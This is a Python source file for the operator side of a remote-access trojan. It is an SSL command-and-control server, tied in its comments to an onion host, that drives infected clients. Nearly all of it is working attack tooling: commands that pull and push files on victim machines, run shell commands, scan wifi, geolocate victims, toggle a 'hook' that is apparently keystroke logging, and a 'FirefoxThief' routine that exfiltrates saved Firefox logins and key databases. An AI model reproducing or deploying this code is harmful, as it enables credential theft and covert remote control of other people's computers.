import socket, ssl, os, sys, time, hashlib, hmac, geoip2.database, subprocess
from colored import fg, bg, attr
from subprocess import Popen, PIPE, STDOUT, check_output
from clint.textui import colored
from tqdm import tqdm

# host = T-master host
host = 'hcjczulezpxxfw2n.onion'
hasher = hashlib.sha256()
# loading geoip2
try:
    reader = geoip2.database.Reader('GeoLite2-City.mmdb')
except:
    print ("Can not load GEOIP2-Database")

# init
#pid1 = subprocess.Popen(args=["xterm","-e","python net.py"]).pid uncommented during dev

print ("%s---------------------------%s" % (fg(46), attr(0)))
print ("%s[Starting server]%s" % (fg(46), attr(0)))
try:
    bindsocket = socket.socket()
    bindsocket.bind(('', 5555))
    bindsocket.listen(5)
    print ("%s%s[server-status] ok.%s" % (fg(46), attr(1), attr(0)))
    print (("%s%s[Onion-Host] " + host + "%s") % (fg(202), attr(1), attr(0)))
    print ("%s---------------------------%s" % (fg(46), attr(0)))
except socket.error, (value,message):
    bindsocket.close()
    print (("%sCould not open socket: " + message + "!!%s") % (fg(196), attr(0)))
    sys.exit(1)

def RecvData():
    temp = connstream.read()
    return temp

def ExecIN(cmd):
    p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
    print (p.stdout.read())

def DigGeoIp(ip):
    response = reader.city(ip)
    country = response.country.name
    city = response.city.name
    print ("|-- " + ip + " " + city + " " + country)

def CheckHash(fileName,fileHashHEX):
    with open(fileName, 'rb') as inFile:
        buf = inFile.read()
        hasher.update(buf)
    if hmac.compare_digest(hasher.hexdigest(),fileHashHEX) == True:
        pass
    else:
        print ("Warning!")

def CalcHash(fileName):
    with open(fileName, 'rb') as inFile:
        buf = inFile.read()
        hasher.update(buf)
    return hasher.hexdigest()

def ExecIN(cmd):
    out = check_output(cmd, shell=True)
    print (out)

def SendData(inText):
    connstream.write(inText)

def DownloadFILE(fileName):
    fileDOWN = open(fileName, 'wa')
    fileSize = int(RecvData())
    print ("[>>>]Downloading: %s Bytes: %s" % (fileName, fileSize))
    FSD = 0
    pbar = tqdm(total=fileSize)
    while 1:
        temp = RecvData()
        if temp == 'CUF':
            break
        else:
            FSD += len(temp)
            fileDOWN.write(temp)
            pbar.update(len(temp))
    pbar.close()


    fileDOWN.close()
    print ("")

def UploadFILE(fileName):
    fileUP = open(fileName, 'rb')
    fileSize = os.path.getsize(fileName)
    print ("[>>>]Uploading: %s Bytes: %s" % (fileName, fileSize))
    FSD = 0
    pbar = tqdm(total=fileSize)
    while 1:
        tempData = fileUP.read()
        if tempData == '':
            break
        else:
            FSD += len(tempData)
            SendData(tempData)
            pbar.update(len(tempData))
    pbar.close()

    fileUP.close()
    print ("")
    SendData("SUF") #Server Upload Finished

while True:
    while True:
        print ("%s...waiting...%s" % (fg(46), attr(0)))
        newsocket, fromaddr = bindsocket.accept()
        try:
            connstream = ssl.wrap_socket(newsocket, server_side=True, certfile="certificate.pem", keyfile="private_key")
        except ssl.SSLError:
            print ("%s%s!!!WARNING!!! BAD CLIENT (or other SSL problem)%s" % (fg(9),attr(1),attr(0)))
            break
        print ("%s...probably good client...%s" % (fg(46), attr(0)))
        time.sleep(2)
        ExecIN("clear")
        cType = RecvData()
        print ("%s----[new-client] " + str(fromaddr) + " :: " + cType + "%s") % (fg(202),attr(0))
        while True:
            inText = raw_input(colored.white('<T2B:')+colored.yellow(cType+'> '))
            if inText.startswith("download"):
                SendData(inText)
                DownloadFILE(inText.split(" ")[1])
            elif inText.startswith("upload"):
                SendData(inText)
                UploadFILE(inText.split(" ")[1])
                chunk = RecvData()
            elif inText.startswith("!"):
		        ExecIN(inText.split("!")[1])
            elif inText.startswith('s-wifi'):
                SendData("get-inferfaces")
                # retrieve list of wireless card, if present scan else print error and go on
                print (("%s"+RecvData()+"%s") % (fg(6),attr(0)))
                card = raw_input("[*] Enter wifi card name: ")
                if card == "none":
                    print colored.red("ScanWIFI stopped")
                else:
                    SendData("ScanWIFI :" + card)
                    report = RecvData()
                    while report != "ScanWIFI-finished":
                        print (("%s|--- " + report+"%s") % (fg(6),attr(0)))
                        report = RecvData()
            elif inText == "info":
                SendData("info")
                infos = RecvData()
                print ("---" + cType + "---")
                while infos != "end-info":
                    if infos.startswith('ip'):
                        if infos.split(':')[1].startswith('Error'):
                            print ("|--- " + infos)
                        else:
                            DigGeoIp(infos.split(':')[1])
                    else:
                        print ("|--- " + infos)
                    infos = RecvData()
            elif inText == "terminate":
                SendData("terminate")
                print (("%s%s----[exit-client] " + str(fromaddr) + " :: " + cType + "%s") % (fg(9),attr(1),attr(0)))
                connstream.close()
                break
            elif inText == "FirefoxThief":
                SendData("FirefoxThief")
                plat = RecvData()
                if plat.startswith("Ok"):
                    listDir = RecvData()
                    if listDir.startswith("Error"):
                        print colored.red(listDir)
                    else:
                        print "[profiles]\n"
                        print (listDir)
                        newdir = raw_input("[DumpDir] ")
                        SendData(newdir)
                        DownloadFILE("profiles.ini")
                        print colored.green("[+] Dumping cert8.db, key3.db and logins.json...")
                        DownloadFILE("cert8.db")
                        DownloadFILE("key3.db")
                        DownloadFILE("logins.json")
                        print colored.green("Finished")
                elif plat.startswith("Error"):
                    print colored.red(plat)
                else:
                    print colored.red("Error not handled")
            elif inText.startswith("hook"):
                if inText == "hook" or inText == "hook:":
                    print colored.yellow("usage:\n"+"-- start --> hook:ON:namefile.txt\n"+"-- check --> hook:check\n"+"-- stop --> hook:OFF\n")
                    print colored.cyan("Suggested name: "+time.ctime().replace(" ", "-"))
                    usage = raw_input("< ")
                    SendData(usage)
                    retstat = RecvData()
                    if retstat.startswith("Error"):
                        print colored.red(retstat)
                    else:
                        print colored.green("==> HOOK"+retstat)
                else:
                    if inText.split(":")[1] == "ON" or inText.split(":")[1] == "check" or inText.split(":")[1] == "OFF":
                        SendData(inText)
                        retstat = RecvData()
                        print colored.green("==> HOOK: "+retstat)
                    else:
                        print "usage:\n" + "-- start --> hook:ON:namefile.txt \n" + "-- check --> hook:check"
                        print "-- stop --> hook:OFF\n"
                        usage = raw_input("< ")
                        SendData(usage)
                        retstat = RecvData()
                        if retstat.startswith("Error"):
                            print colored.red(retstat)
                        else:
                            print colored.green("==> HOOK"+retstat)
            elif inText.startswith('protect'):
                    SendData(inText)
                    inText = RecvData()
                    while inText != 'END':
                        print (inText)
                        inText = RecvData()
            elif inText.startswith("exec"):
                SendData(inText)
                print ("")
                outEXEC = RecvData()
                print (outEXEC)
            else:
                connstream.write(inText)
                outTT = RecvData()
                print (('%s[outText] ' + outTT +"%s") % (fg(6),attr(0)))
